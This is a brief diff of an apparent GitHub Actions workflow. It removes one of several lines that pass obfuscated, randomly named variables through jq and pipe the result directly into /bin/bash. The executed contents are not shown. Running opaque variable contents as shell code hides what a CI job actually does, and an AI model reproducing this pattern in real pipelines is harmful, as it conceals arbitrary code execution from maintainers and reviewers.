@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$xtd2018" | jq -r .odrsg4330 | /bin/bash
           echo $qd7340 | jq -r .qw99308 | /bin/bash
           printf '%s' "$tys3363" | jq -r .bqk72 | /bin/bash
-          printf '%s' "$ffd92385" | jq -r .fmba4 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
